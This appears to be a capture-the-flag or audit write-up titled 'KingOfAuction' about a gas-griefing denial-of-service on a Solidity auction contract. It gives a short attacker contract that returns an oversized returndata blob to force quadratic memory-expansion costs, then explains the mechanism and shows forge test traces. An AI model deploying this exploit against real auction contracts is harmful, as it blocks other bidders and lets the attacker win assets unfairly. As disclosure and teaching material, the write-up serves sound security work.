KingOfAuction
=============

A bidder can block any other bid from succeeding by registering themselves as the highest and second highest bidder with the following simple contract:

```
contract C{
    function youHaveBeenOutbid(uint newBid) external payable returns(bool) {
        assembly{
            return(0x0, 0x1a5000)
        }
    }
}
```

Why is that?
------------

Even though there is fixed amount of return data expected for `youHaveBeenOutbid`, the solidity compiler still moves the "free memory pointer" by the amount of return data it receives. That is even though that data is never read.

Hence the attacker tries to return as much data as possible within the 6 million gas. Changing the memory pointer itself is not the problem. However, the final `Bid` event that gets emitted requires a memory write. Now the `Auction` contract has to pay for the memory expansion. As the memory expansion costs are quadratic, the attacker can make the `bid()` execution as expensive as 34,696,239 gas (see provided tests). Hence, it can never be executed in the 30 million block gas limit.

Relevant Test Output (obtained using `forge test -vvvv`):

```
  [34706581] ContractTest::testExample()
    ├─ [0] VM::deal(0xb4c79dab8f259c7aee6e5b2aa729821864227e84, 10000000000000000000)
    │   └─ ← ()
    ├─ [34696239] Auction::bid{value: 2000000000000000000}()
    │   ├─ [5833586] ContractTest::youHaveBeenOutbid{value: 1000000000000000000}(2000000000000000000)
    │   │   └─ ← false
    │   ├─ [5833586] ContractTest::youHaveBeenOutbid{value: 1000000000000000000}(2000000000000000000)
    │   │   └─ ← false
    │   ├─ emit Bid(newBid: 2000000000000000000)
    │   └─ ← ()
    └─ ← ()
```


What is there to gain?
----------------------

The attacker can get all their favorite NFTs for super cheap. As nobody else can bid. Super nice.
